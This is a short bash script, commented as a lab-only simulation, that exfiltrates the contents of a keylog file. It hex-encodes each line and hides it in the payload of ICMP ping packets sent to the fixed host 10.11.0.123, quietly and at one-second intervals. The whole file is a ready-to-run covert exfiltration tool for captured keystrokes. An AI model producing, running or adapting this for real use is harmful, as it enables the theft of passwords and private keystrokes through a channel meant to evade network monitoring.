#!/bin/bash
# Simulates exfil via ping - for lab environments only

KEYLOG_FILE="$1"
DEST="10.11.0.123"

if [[ ! -f "$KEYLOG_FILE" ]]; then
  echo "Usage: $0 <keylog.txt>"
  exit 1
fi

while read -r LINE; do
  ping -c1 -p "$(echo $LINE | xxd -p)" "$DEST" > /dev/null
  sleep 1
done < "$KEYLOG_FILE"
